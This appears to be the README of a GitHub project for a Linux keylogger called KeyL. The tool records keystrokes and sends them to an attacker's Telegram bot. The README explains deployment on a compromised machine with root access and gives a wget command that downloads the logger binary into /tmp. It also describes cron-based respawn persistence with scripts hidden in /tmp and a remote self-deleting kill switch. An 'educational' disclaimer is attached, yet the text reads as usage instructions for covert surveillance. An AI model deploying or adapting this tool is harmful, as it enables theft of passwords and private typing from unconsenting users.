# KeyL

This program records keystrokes and sends them to a telegram bot, until the attacker send the `/kill` command so the program delete itself from the target's machine.

It require root access to the target.

## Disclaimer:
This project of a Key Logger is for **educational purposes**, it has been created only with my mere knowledge. Do **not** deploy or use this code on any system without explicit permission from the owner. Misuse of this software may violate laws and going to jail for stupid reasons it's dumb.

## How2UseIt

Once you gain access to the target machine, you have to options:
1. execute the `make.sh` .
2. copy and paste the content of `toBePasted.txt` .

You need to configure it for your own setup. Here's how:

1. **Set Your Telegram Token** (Mandatory) 
   Open `config.py` and insert your Telegram bot token.  
   > If you’re unsure how to get one, just ask ChatGPT or refer to the [Telegram Bot API docs](https://core.telegram.org/bots).

2. **Customize Logger Behavior**  (Optional)
   You can configure the logger by modifying flags inside `KeyL.py`.  
   If you make changes, you'll need to build your own version to install.

By default, `toBePasted.txt` installs the static version hosted on GitHub:
```bash
wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
```


Before starting the program, send a dummy message to the Telegram bot.
This is necessary for the bot to retrieve your chat_id and be able to respond to you.

To stop the keylogger on a specific machine remotely,
send the command `/kill <machine_id>` to the Telegram bot.


## How it works
<img width="800" height="400" alt="killSwitchMechanism" src="https://github.com/user-attachments/assets/aac92346-7d68-4f4b-8460-fb7a1a382a45" />

The persistence mechanism is simple (and quite weak): if the logger process is killed, it gets respawned automatically by a cronjob calling launc.sh.
I have hidden the .sh files in the /tmp directory. I could have made it stealthier, but this project is just for academic purposes.

Once the main program calls KillSwitch.sh, the latter delete every file concerning us, and cleans the crojob.

The make.sh script (or the toBePasted.txt) creates the files shown in the image above.
Now, let’s dive into what the code does.

## Code

It monitors every keypress and stores each key in a buffer. Once the buffer reaches a certain threshold, it sends the content to a Telegram bot.

Specifically, the monitorShift() function checks whether the Shift key is being held down and communicates this through a global flag to monitorKeys(), which logs the pressed keys. If necessary, the keys are passed through a dictionary to convert them to their uppercase equivalents.




